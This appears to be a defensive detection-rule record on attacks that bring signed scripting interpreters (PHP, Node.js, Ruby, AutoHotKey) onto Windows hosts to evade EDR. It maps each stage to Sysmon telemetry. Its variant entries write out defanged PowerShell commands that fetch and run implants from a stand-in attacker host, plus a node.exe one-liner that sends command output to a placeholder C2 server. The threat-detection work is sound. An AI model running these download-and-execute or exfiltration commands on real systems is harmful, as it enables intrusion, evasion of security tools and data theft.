Name: BYOSI Scripting Interpreters
Id: ed830139-29ec-4235-8d30-87bee83e6933
MitreIds:
- T1059.006
- T1059.007
- T1059
- T1027.010
- T1218
Tactics:
- Defense Evasion
- Execution
Techniques:
- 'Command and Scripting Interpreter: Python'
- 'Command and Scripting Interpreter: JavaScript'
- Command and Scripting Interpreter
- 'Obfuscated Files or Information: Command Obfuscation'
- System Binary Proxy Execution
DetectionPriority: HIGH
ThreatPrevalence: EMERGING
DetectionDifficulty: HIGH
Description: >
  Adversaries bring legitimate, vendor-signed scripting interpreters (Python, PHP, Node.js,
  Ruby, Perl, AutoHotKey, etc.) onto a target system and execute malicious scripts through
  them, bypassing EDR solutions that focus on binary analysis and API hooking. Because
  every interpreter binary is validly signed by its vendor, EDRs whitelist or deprioritize
  the process. The malicious logic lives in plain-text script files that most EDR engines
  do not scan. The chokepoint is invariant: regardless of which interpreter is chosen,
  the attacker must (1) write or download a non-default interpreter binary to disk,
  (2) execute that interpreter as a new process, and (3) have the interpreter load and
  run attacker-controlled script content that performs the actual malicious action (C2
  callback, credential theft, lateral movement). Each of these three stages produces
  telemetry that survives tool rotation across all 13+ supported interpreter languages.
LastUpdated: '2026-03-29'
Author: '@iimp0ster'

Chokepoints:
- Stage: Interpreter Deployment
  Input: Attacker has code execution on the target
  Invariant: A non-default scripting interpreter runtime must be introduced to the system, either written to disk as a
    standalone binary or loaded in-memory as embedded DLLs within a .NET host process (IronPython, Boolang)
  Observable: 'Disk-based: Sysmon EID 11 showing a vendor-signed interpreter binary (python.exe, php.exe, node.exe) written
    to a user-writable directory. In-memory: Sysmon EID 7 showing interpreter DLLs (IronPython.dll, Microsoft.Scripting.dll)
    loaded by a .NET host process.'
  WhyCantBypass: The interpreter runtime is required to parse and execute scripts. It cannot be replaced by a native OS
    component without losing language compatibility. Whether deployed as a binary or embedded DLLs, the runtime must be present.
  LogSources:
  - Sysmon Event ID 11 (File Create)
  - Sysmon Event ID 1 (Process Creation, archive extraction)
  - Windows Security Event ID 4688 (Process Creation)
  DetectionTier: Research
  SigmaRef: sigma-rules/byosi/research.yml
- Stage: Interpreter Execution
  Input: Interpreter runtime is available, either as a binary on disk or as embedded DLLs in a host process
  Invariant: The non-default interpreter binary must be launched as a new process to run attacker scripts.
  Observable: 'Sysmon EID 1 showing python.exe, node.exe, php.exe, etc. running from a non-standard path
    (not Program Files). Command line may reveal the script being executed or inline code.'
  WhyCantBypass: Script files require their matching interpreter process to execute. There is no way to run Python/PHP/Node scripts without spawning the interpreter.
  LogSources:
  - Sysmon Event ID 1 (Process Creation)
  - Windows Security Event ID 4688 (Process Creation)
  - Sysmon Event ID 7 (Image Loaded, interpreter DLLs)
  DetectionTier: Hunt
  SigmaRef: sigma-rules/byosi/hunt.yml
- Stage: Malicious Script Action
  Input: Interpreter is running with attacker-controlled script content
  Invariant: The interpreter must load attacker-controlled script content and perform an observable action (network connection, file write, process spawn, credential access).
  Observable: 'Sysmon EID 3 showing outbound connections from the interpreter process. EID 1 showing child processes
    spawned by the interpreter. EID 11/12/13 showing file or registry modifications.'
  WhyCantBypass: The script must interact with the OS to achieve its objective. C2 callbacks require network, data theft requires file/process access, persistence requires registry/filesystem writes.
  LogSources:
  - Sysmon Event ID 3 (Network Connection)
  - Sysmon Event ID 1 (Child Process Creation)
  - Sysmon Event ID 11 (File Create)
  - Sysmon Event ID 12/13 (Registry Create/Set Value)
  DetectionTier: Analyst
  SigmaRef: sigma-rules/byosi/analyst.yml
  BypassNote: >
    If the interpreter uses built-in socket libraries for C2 without spawning child
    processes, detection relies on network telemetry from the interpreter process itself.

Variations:
- Name: BYOSI PHP Shell (oldkingcone)
  FirstSeen: 2024-Q2
  Status: Active
  SourceURL: https://github.com/oldkingcone/BYOSI
  Notes: >
    Original BYOSI proof-of-concept. Downloads PHP for Windows, extracts to C:\Temp\php,
    fetches a PHP implant script, and executes it. Four lines of PowerShell evade
    CrowdStrike, Trellix, and SentinelOne in tested environments. SentinelOne confirmed
    unable to scan PHP file types.
  VariantId: byosi-php-shell
  Command:
    Invocation: "# Four lines of PowerShell. Evaded CrowdStrike, Trellix, SentinelOne:\nInvoke-WebRequest -Uri \"hxxps[://]windows.php.net/downloads/releases/php-8.2.0-nts-Win32-vs16-x64.zip\" -OutFile \"$env:TEMP\\php.zip\"\nExpand-Archive \"$env:TEMP\\php.zip\" -DestinationPath \"C:\\Temp\\php\"\nInvoke-WebRequest -Uri \"hxxps[://]attacker[.]com/implant.php\" -OutFile \"C:\\Temp\\php\\shell.php\"\nC:\\Temp\\php\\php.exe C:\\Temp\\php\\shell.php"
    Context: 'Original BYOSI PoC. Downloads official PHP for Windows, extracts to C:\Temp\php, fetches PHP implant, executes. SentinelOne confirmed unable to scan PHP file types.'
    Artifacts:
    - 'Sysmon EID 11: php.exe written to C:\Temp\php\'
    - 'Sysmon EID 1: php.exe running from non-standard path'
    - 'Sysmon EID 3: php.exe making outbound C2 connection'
  ChokepointMapping: 'PHP binary downloaded to TEMP → php.exe launched from non-standard path → C2 callback'
- Name: PolyDrop (Multi-Language BYOSI)
  FirstSeen: 2024-Q3
  Status: Active
  SourceURL: https://github.com/MalwareSupportGroup/PolyDrop
  Notes: >
    Expanded BYOSI toolkit supporting 13 scripting languages (Python, Ruby, Perl, Lua,
    PHP, Node.js, Tcl, R, Dart, Deno, Bun, Nim, Crystal). Rapid payload deployment
    across Windows, macOS, and Linux. Vulners AI risk score 7.2 High.
  VariantId: polydrop-multi-language
  Command:
    Invocation: "# Supports 13 languages. Example with Ruby:\nInvoke-WebRequest -Uri \"hxxps[://]github.com/.../rubyinstaller-3.2.2-1-x64.exe\" -OutFile \"$env:TEMP\\ruby.exe\"\nStart-Process \"$env:TEMP\\ruby.exe\" -ArgumentList \"/silent\" -Wait\nInvoke-WebRequest -Uri \"hxxps[://]attacker[.]com/payload.rb\" -OutFile \"$env:TEMP\\payload.rb\"\nruby.exe \"$env:TEMP\\payload.rb\""
    Context: 'Expanded BYOSI toolkit supporting 13 languages. Each interpreter is legitimately signed. EDR trusts the binary and cannot scan the script.'
    Artifacts:
    - 'Sysmon EID 11: Non-default interpreter binary written to TEMP/AppData'
    - 'Sysmon EID 1: Interpreter running from non-standard path'
    - 'Sysmon EID 3: Interpreter making outbound C2 connection'
  ChokepointMapping: 'Interpreter downloaded to TEMP → launched from non-standard path → script executes → C2 callback'
- Name: IronNetInjector (Turla APT — IronPython BYOI)
  FirstSeen: 2021-Q1
  Status: Active
  SourceURL: https://unit42.paloaltonetworks.com/ironnetinjector/
  Notes: >
    Turla APT uses IronPython interpreter embedded via .NET to load malicious Python
    scripts that inject Turla tools into memory. Documented by Palo Alto Unit 42.
    Demonstrates nation-state adoption of BYOI tradecraft for in-memory execution
    without touching PowerShell.
  VariantId: ironnetinjector-turla-ironpython
  Command:
    Invocation: "# IronPython embedded via .NET:\n# Malicious Python scripts loaded into memory via IronPython runtime\n# No python.exe on disk. Uses .NET-hosted IronPython DLLs\n# Injects Turla tools into legitimate processes"
    Context: 'Turla APT. Uses IronPython via .NET to avoid dropping python.exe. Loads malicious .py scripts in memory. Documented by Unit 42.'
    Artifacts:
    - 'Sysmon EID 7: IronPython DLLs loaded (IronPython.dll, Microsoft.Scripting.dll)'
    - 'Sysmon EID 1: .NET host process loading IronPython assemblies'
    - 'Memory: Python bytecode in non-Python process memory'
  ChokepointMapping: '.NET loads IronPython DLLs → Python scripts execute in-memory → Turla tools injected'
- Name: Node.js Malware Delivery (ClickFix → NodeLoader)
  FirstSeen: 2025-Q1
  Status: Active
  SourceURL: https://www.microsoft.com/en-us/security/blog/2025/04/15/threat-actors-misuse-node-js-to-deliver-malware-and-other-malicious-payloads/
  Notes: >
    Microsoft documented threat actors downloading node.exe via PowerShell (often
    delivered through ClickFix social engineering) and executing inline JavaScript for
    C2 and data exfiltration. NodeLoader variant uses sudo-prompt module for privilege
    escalation, delivering cryptominers and infostealers.
  VariantId: nodejs-malware-delivery-clickfix
  Command:
    Invocation: "# Delivered via ClickFix, then:\npowershell -c \"Invoke-WebRequest -Uri 'hxxps[://]nodejs[.]org/dist/v20.0.0/node-v20.0.0-win-x64.zip' -OutFile node.zip\"\nExpand-Archive node.zip -DestinationPath C:\\Users\\Public\\node\nC:\\Users\\Public\\node\\node.exe -e \"require('child_process').exec('whoami',function(e,o){require('https').request({hostname:'c2[.]attacker[.]com',path:'/'+o})})\""
    Context: 'Microsoft documented (April 2025). PowerShell downloads node.exe, inline JavaScript for C2 and exfil. NodeLoader uses sudo-prompt for privesc.'
    Artifacts:
    - 'Sysmon EID 11: node.exe written to Users\Public or AppData'
    - 'Sysmon EID 1: node.exe with -e flag and inline JavaScript'
    - 'Sysmon EID 3: node.exe outbound to non-npm domain'
  ChokepointMapping: 'node.exe downloaded to Public → node.exe -e inline JS → outbound C2 connection'
- Name: Lu0Bot (Node.js C2)
  FirstSeen: 2023-Q2
  Status: Active
  SourceURL: https://any.run/cybersecurity-blog/lu0bot-analysis/
  Notes: >
    Node.js-based malware where the interpreter accepts encrypted JavaScript as input.
    Uses WMIC for system reconnaissance. Demonstrates portable Node.js runtime bundled
    with encrypted payload scripts for full C2 capability.
  VariantId: lu0bot-nodejs-c2
  Command:
    Invocation: "node.exe --eval \"<encrypted_js_payload>\"\n# Uses WMIC for system recon:\nwmic computersystem get model\nwmic os get caption\n# C2 via encrypted WebSocket"
    Context: 'Node.js-based malware accepting encrypted JavaScript. WMIC for recon. Encryption prevents script content inspection by EDR.'
    Artifacts:
    - 'Sysmon EID 1: node.exe with --eval flag and encrypted content'
    - 'Sysmon EID 1: wmic.exe spawned by node.exe'
    - 'Sysmon EID 3: node.exe WebSocket connection to C2'
  ChokepointMapping: 'node.exe deployed → encrypted JS via --eval → WMIC recon → encrypted WebSocket C2'
- Name: Python Bytecode Evasion (PYC Execution)
  FirstSeen: 2023-Q4
  Status: Emerging
  SourceURL: https://www.csoonline.com/article/575475/attackers-use-python-compiled-bytecode-to-evade-detection.html
  Notes: >
    Attackers hide malicious logic in compiled Python bytecode (.pyc) files that are
    directly executable by the Python interpreter but invisible to security scanners
    that only inspect .py source files. ReversingLabs called it potentially the first
    supply chain attack exploiting PYC execution.
  VariantId: python-bytecode-pyc-evasion
  Command:
    Invocation: "# Attacker pre-compiles Python scripts to .pyc bytecode:\npython -m py_compile payload.py\n# Deploys python.exe + payload.pyc:\npython.exe payload.pyc\n# .pyc files bypass text-based content scanning"
    Context: 'Pre-compiled Python bytecode (.pyc) bypasses text-based content scanning. The interpreter still must exist on disk and execute.'
    Artifacts:
    - 'Sysmon EID 11: python.exe + .pyc file written to non-standard path'
    - 'Sysmon EID 1: python.exe executing .pyc file'
  ChokepointMapping: 'python.exe + .pyc deployed → python.exe launched → bytecode executed → C2 callback'
- Name: BYOI .NET Embedded Interpreters (Boolang, IronPython)
  FirstSeen: 2020-Q1
  Status: Active
  SourceURL: https://www.blackhillsinfosec.com/red-teamers-cookbook-byoi-bring-your-own-interpreter/
  Notes: >
    Red team tradecraft embedding Boolang, IronPython, or other .NET-compatible
    interpreters inside C# assemblies. Executes third-party scripting languages entirely
    in memory via .NET runtime without touching PowerShell or cmd.exe. Popularized by
    Marcello Salvati (Black Hills InfoSec) at DerbyCon 2019.
  VariantId: byoi-dotnet-embedded-interpreters
  Command:
    Invocation: "# .NET application embeds Boolang or IronPython runtime:\n# No standalone interpreter binary on disk\n# Scripts loaded from embedded resources or fetched remotely\n# Executes within the .NET host process"
    Context: 'Interpreter embedded within .NET application. No standalone binary to detect on disk. Scripts execute within the .NET host process memory.'
    Artifacts:
    - 'Sysmon EID 7: Boolang or IronPython DLLs loaded by .NET process'
    - 'Sysmon EID 1: .NET host with interpreter-related assemblies'
  ChokepointMapping: '.NET host loads interpreter DLLs → scripts execute in-process → C2/payload actions'
- Name: AutoHotKey Script Abuse
  FirstSeen: 2024-Q1
  Status: Emerging
  SourceURL: https://www.mcafee.com/blogs/other-blogs/mcafee-labs/the-darkgate-menace-leveraging-autohotkey-attempt-to-evade-smartscreen/
  Notes: >
    Threat actors bundle AutoHotKey interpreter with malicious .ahk scripts to deploy
    keyloggers, credential stealers, and RATs. The AHK interpreter is signed and
    trusted, allowing script execution to bypass application whitelisting.
  VariantId: autohotkey-script-abuse
  Command:
    Invocation: "AutoHotkey.exe malicious_script.ahk\n# AHK scripts can: keylog via SetWindowsHookEx, screenshot, execute shell commands, establish C2 via WinHTTP COM"
    Context: 'Legitimate automation tool. Attacker brings interpreter + .ahk script. The .ahk file type is not scanned by most EDR products.'
    Artifacts:
    - 'Sysmon EID 11: AutoHotkey.exe written to non-standard path'
    - 'Sysmon EID 1: AutoHotkey.exe running from AppData/Temp'
    - 'Sysmon EID 3: AutoHotkey.exe outbound C2'
  ChokepointMapping: 'AutoHotkey.exe + .ahk script deployed → interpreter launched → keylogging/C2 → exfil'

Prerequisites:
- Ability to write files to disk on the target system (interpreter binary + script payload)
- The scripting interpreter must be a legitimately signed binary compatible with the target OS
- Attacker-controlled script content must be accessible to the interpreter (local file, inline argument, or remote fetch)
- No application whitelisting policy blocking execution of the specific interpreter binary from non-standard paths

